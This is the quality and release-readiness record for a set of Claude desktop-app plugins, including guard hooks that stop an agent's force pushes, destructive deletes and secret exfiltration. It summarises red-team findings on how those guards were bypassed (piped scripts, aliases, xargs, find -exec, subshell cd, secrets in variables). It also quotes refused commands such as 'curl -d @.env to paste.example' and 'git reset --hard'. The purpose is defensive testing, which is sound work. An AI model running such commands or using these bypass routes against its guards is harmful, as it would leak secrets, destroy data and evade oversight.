# Quality

What has been checked for each mod, against a release bar, as facts with dates. A row says what was checked and when, never how good the mod is, and it never claims more than its evidence.

- **Measured** (the version, tests passing, strict validation, hooks that fail open): read from the plugins by `tools/quality.py`, so they cannot drift. `bash tools/preflight.sh` tells you when this file is out of date; `python3 tools/quality.py --write` brings it up to date.
- **Witnessed** (reviews, sightings in the real app, a cold install, new tests watched failing first): written by people in `tools/quality-facts.json`, each with the date and the commit it was about. A witnessed fact is **fresh** only while the part of the plugin it is about has not changed since that commit (a review or a sighting: the hooks, tests and sounds; the docs audit: the README and the hooks; a cold install: the whole plugin). After such a change it shows **stale** until someone looks again.

## The release bar

Eight gates. The lead mods (the first three) must meet all eight before release. The others must meet the first six (all but the desktop sighting and the cold install) to be on the shelf of extras, and all eight to be released.

| Mod | Tests pass | Strict validation | Hooks fail open | New tests failed first | Independent code review | Seen in the desktop app | Docs audited | Cold install by someone else | Verdict |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| critter-buddy | met | met | met | stale | stale | stale | stale | open | Not ready: 5 of 8 open |
| critter-mods | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-ward | met | met | met | met | stale | met | stale | open | Not ready: 3 of 8 open |
| critter-diary | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-bell | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-crab | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-stunt | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-tally | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-measure | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
| critter-clock | met | met | met | open | open | open | open | open | Not ready: 5 of 8 open |
| critter-ledger | met | met | met | open | open | open | open | open | Not ready: 5 of 8 open |
| critter-latch | met | met | met | met | stale | stale | open | open | Not ready: 4 of 8 open |
| critter-seal | met | met | met | stale | stale | met | open | open | Not ready: 4 of 8 open |

met: done, and nothing has changed since. stale: done, but the plugin has changed since, so it needs another look. open: not done yet.

## The whole repository

- 2026-11-11 (at 1fbc7d5): gitleaks over the full git history. Found: no leaks (re-run on 107 commits the same day).
- 2026-11-11 (at d6bd248): a cold clone installs and passes preflight. Found: it does (checked in the audit session; this is a reproducibility check, not the cold install by someone else that the bar asks for).
- 2026-11-11 (at 6c84daa): renamed the eight bare-word plugins into one critter-* family, with a preflight gate against old ids. Found: slash commands unchanged; the plugin store of each renamed plugin starts fresh.

## The lead mods

### critter-buddy 0.30.2

| | |
| --- | --- |
| Tests passing | 180 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | Claude desktop app, terminal |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): independent code review of the clock, the painter cache, the band sky, trust and pane width. Found: 2 confirmed bugs and 5 smaller; all fixed with a test that failed first.
- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: 14 claims corrected across the repo.
- 2026-11-11 (at 10f284e): read against the official mods guide and the host's own type declarations. Found: a subagent's turn.complete was counted as the person's turn; fixed with a test that failed first.
- 2026-11-11 (at 147e77a): the whole voice read for scolding, nagging and watching. Found: greetings, weekday lines and warnings softened, and a test now covers every line the pair can say.

**New tests watched failing first**

- 2026-11-11 (at 0729a52): every test added that day (the clock, the painters, the sky, trust, pane width, the prompt box words) was watched failing on the old code, then passing.

**Seen working in the real app**

- 2026-11-11 (at 7bb227d), Claude desktop app: the band and its buttons, the sky in the band, /critter doctor, /critter perf, the prompt box colouring.

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- the corner and the stage have not been seen in the real app
- the cat overlapping Pip when a side panel opens was seen once and not reproduced

### critter-mods 0.7.0

| | |
| --- | --- |
| Tests passing | 64 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | Claude desktop app, terminal |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: stamp words, line counts and what /mods needs corrected.
- 2026-11-11 (at 3c843c2): independent code review (injection, state, card painter, README claims). Found: one high finding (an unreadable plugin list looked like "nothing installed") and four smaller ones fixed with tests; open and not fixed: the pane is not re-read after a failed or timed-out switch, "install all" hides which installs failed, session start waits up to 20 s on the plugin manager, a double press runs the CLI twice.
- 2026-11-11 (at 147e77a): independent code review, three rounds of the fixes for the earlier open findings. Found: the pane is re-read after a failed or timed-out switch, install all names each failure and why, a session never waits on the plugin manager, what a session loaded is seeded by the first good read, a flaky read keeps the last good list and says so, and a missing import was found and fixed; the old short names still work as aliases.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- the index cards have not been photographed in the real app

### critter-ward 0.3.0

| | |
| --- | --- |
| Tests passing | 79 |
| Strict validation | passes |
| Tool-path hooks | fails closed on purpose: when it cannot tell, the thing it guards waits |
| Surfaces | any surface that runs hooks (it draws nothing) |
| Verdict | Not ready: 3 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): independent red-team for ways past it. Found: 5 bypasses (piped scripts, an alias made on the line, xargs -I%, hidden command names), all fixed with a test that failed first; 2 gaps documented.
- 2026-11-11 (at 1fbc7d5): second independent red-team round, run by the audit session (about 280 spellings of pushes to main and of force pushes). Found: no bypass.
- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: the claim of no network and nothing read outside the session was corrected to say that guard runs git locally.
- 2026-11-11 (at d2ecd7d): closing the alias gap the second red-team round left open. Found: a git alias in a config file ran unjudged; now read from git config and judged, with a test that failed first.

**New tests watched failing first**

- 2026-11-11 (at 22572aa): the permission check asking about a line that runs an unread expansion: the test was watched failing on the old hook, then passing (the nine earlier lines were watched at cf08b68).

**Seen working in the real app**

- 2026-11-11 (at 1dadf72), Claude desktop app (an agent session; read from its transcript, not watched by a person): git push --force origin main on a branch named main with no remote was refused before Bash ran it, with "guard: a force push rewrites history other people may already have.".

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- a program that changes main or .git/HEAD earlier on the line is not tracked (documented)
- the question for a line that runs an expansion has not been seen in the real app

## The others

### critter-diary 0.6.1

| | |
| --- | --- |
| Tests passing | 33 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | Claude desktop app, terminal |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: no claims needed correcting.
- 2026-11-11 (at 10f284e): read against the official mods guide and the host's own type declarations. Found: a subagent's turn.complete was counted as the person's turn; fixed with a test that failed first.
- 2026-11-11 (at 3c843c2): independent code review (timing, storage, privacy, claims). Found: nothing high; open and not fixed: the week is held in session-scoped state so the README promise of 14 days does not hold after a restart, "/diary clear" leaves the week counts, a duration can print "1 min 60 s" or "1 ms", an MCP tool name goes unescaped into the postcard. Privacy confirmed: names and times only.
- 2026-11-11 (at 147e77a): independent code review, three rounds of the fixes for the earlier open findings. Found: the week now lives in the store and survives a restart, /diary clear empties it, spans and the markdown are escaped; the rounds found and fixed a hung store holding up tools, clear racing a write, a missing import, a leaked timer, autolinks and bidi controls in tool names; open: two sessions at once can undercount, and a store step that times out is not cancelled.
- 2026-11-11 (at 508d932): read in full. Found: the same property-name bug in the day counts and the postcard; fixed with a test that failed first.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- the 14-day week does not survive a restart (session-scoped state)
- /diary clear does not clear the week
- never seen in the real app

### critter-bell 0.6.1

| | |
| --- | --- |
| Tests passing | 23 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | any surface that plays sound or shows toasts |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: failure toast, playback and tick wording corrected.
- 2026-11-11 (at 10f284e): read against the official mods guide and the host's own type declarations. Found: a subagent's turn.complete was counted as the person's turn; fixed with a test that failed first.
- 2026-11-11 (at 3c843c2): independent code review (timing, failure modes, claims). Found: nothing high; open and not fixed: its three settings (minSeconds, sound, shortTurns) have no declared way to be set, a long command rings twice (command and turn), the bell is awaited before the tool result returns, the time may include the permission dialog.
- 2026-11-11 (at 147e77a): independent code review, three rounds of the fixes for the earlier open findings. Found: the three settings are declared and can be set, a command and its turn ring once, the sound and toast are not awaited; a failing toast no longer disturbs the turn; open: the time may include the permission dialog.
- 2026-11-11 (at 508d932): read in full against the host's type declarations. Found: its three settings were never declared in the manifest, so they could not be set; declared, with tests that failed first.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never heard or seen in the real app

### critter-crab 0.3.2

| | |
| --- | --- |
| Tests passing | 27 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | Claude desktop app, terminal |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: the root README line described an older version.
- 2026-11-11 (at 3c843c2): independent code review (note storage, unicode, folder key). Found: one small finding fixed (direction controls could reverse a note); open and not fixed: /crab drop does nothing if the store could not be read at start, two folders writing at once can overwrite each other, the folder key is the raw path as given.
- 2026-11-11 (at 147e77a): independent code review, three rounds of the fixes for the earlier open findings. Found: a note whose first read failed can be seen and dropped once the store answers, and the band redraws; while the store is down it says so; the previous folder is forgotten before the next hashes; open: two folders writing at once can overwrite each other.
- 2026-11-11 (at 508d932): read in full (a short review by the audit session). Found: no bug found.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never seen in the real app

### critter-stunt 0.2.1

| | |
| --- | --- |
| Tests passing | 18 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | Claude desktop app, terminal |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: no claims needed correcting.
- 2026-11-11 (at 3c843c2): independent code review (timers, cards). Found: nothing high; open and not fixed: the 160 ms follow-up timer is not cancelled when the pane closes. Cards show tool names only.
- 2026-11-11 (at 147e77a): independent code review, three rounds of the fixes for the earlier open findings. Found: the blink's follow-up timer is cancelled with the pane and cannot re-arm or raise; a pane lookup that fails is contained.
- 2026-11-11 (at 508d932): read in full (a short review by the audit session). Found: no bug found.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never seen in the real app

### critter-tally 0.2.1

| | |
| --- | --- |
| Tests passing | 11 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | Claude desktop app, terminal |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: no claims needed correcting.
- 2026-11-11 (at 3c843c2): independent code review (counts, raster). Found: nothing high; the raster encoding is right for zero to three tools. Open: ties in the top three go to the tool called first (undocumented).
- 2026-11-11 (at 508d932): read in full. Found: a tool named like an object property corrupted the tally; fixed with a test that failed first.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never seen in the real app

### critter-measure 0.2.1

| | |
| --- | --- |
| Tests passing | 7 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | any surface (it is a tool the model calls) |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- 2026-11-11 (at 5a3a16d): documentation audit against the code. Found: no claims needed correcting.
- 2026-11-11 (at 3c843c2): independent code review (counting, inputs). Found: two found and fixed (a non-string input was counted as text, a very long text could overflow the stack in Node); the README now says what it returns.
- 2026-11-11 (at 508d932): read in full (a short review by the audit session). Found: no bug found.

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never called by the model in the real app

### critter-clock 0.1.1

| | |
| --- | --- |
| Tests passing | 9 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | any surface that runs hooks (it draws nothing) |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- none yet

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never seen in the real app

### critter-ledger 0.1.1

| | |
| --- | --- |
| Tests passing | 9 |
| Strict validation | passes |
| Tool-path hooks fail open | yes, checked by preflight |
| Surfaces | any surface that runs hooks (it draws nothing) |
| Verdict | Not ready: 5 of 8 open |

**Independent reviews**

- none yet

**New tests watched failing first**

- not recorded yet

**Seen working in the real app**

- not yet

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- never seen in the real app; token counts come from the engine's per-turn usage, not checked against a bill

### critter-latch 0.1.2

| | |
| --- | --- |
| Tests passing | 64 |
| Strict validation | passes |
| Tool-path hooks | fails closed on purpose: when it cannot tell, the thing it guards waits |
| Surfaces | any surface that runs hooks (it draws nothing) |
| Verdict | Not ready: 4 of 8 open |

**Independent reviews**

- 2026-11-11 (at 6d0101c): independent adversarial review for ways past it and false stops (about 600 commands run through it). Found: 4 high bypasses (cd leaking out of a subshell, pushd/popd, a leading redirect, find -exec) and about 8 smaller, plus false stops on redirects and heredoc bodies; all fixed with a test that failed first.
- 2026-11-11 (at cf375f3): second independent adversarial review, on the code that fixed the first. Found: 12 smaller bypasses on the first fixes and one common false stop; all fixed with a test that failed first.

**New tests watched failing first**

- 2026-11-11 (at 6b1d64a): a delete after a cd to a folder outside, and a cd out and back in: both tests were watched failing on 0.1.1, then passing.

**Seen working in the real app**

- 2026-11-11 (at 1dadf72), Claude desktop app (an agent session; read from its transcript, not watched by a person): git reset --hard was refused before it ran. The same sighting found cd <a temp folder> && rm -rf dist running where it should have been stopped (0.1.1); fixed in 0.1.2, and the fix has not been seen live.

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- the fixes after the review have not been reviewed again

### critter-seal 0.1.1

| | |
| --- | --- |
| Tests passing | 59 |
| Strict validation | passes |
| Tool-path hooks | fails closed on purpose: when it cannot tell, the thing it guards waits |
| Surfaces | any surface that runs hooks (it draws nothing) |
| Verdict | Not ready: 4 of 8 open |

**Independent reviews**

- 2026-11-11 (at 6d0101c): independent adversarial review for ways past it and false holds (about 330 commands run through it). Found: high gaps (a sender after a bracket or keyword, a secret in a variable or a copied file, the environment dump, wrappers, globbed names, directories) and a proxy/connect-to blind spot, plus false holds on key options and download URLs; all fixed with a test that failed first.
- 2026-11-11 (at cf375f3): second independent adversarial review, on the code that fixed the first. Found: 8 high gaps on the first fixes plus medium ones; all fixed with a test that failed first.

**New tests watched failing first**

- 2026-11-11 (at cf375f3): the review findings: each command that got past it has a test that failed on the first version, then passed.

**Seen working in the real app**

- 2026-11-11 (at 1dadf72), Claude desktop app (an agent session; read from its transcript, not watched by a person): curl -d @.env to paste.example was held back with the README's message, word for word.

**Cold install by someone who is not the founder**

- not yet

**Known gaps**

- the fixes after the review have not been reviewed again
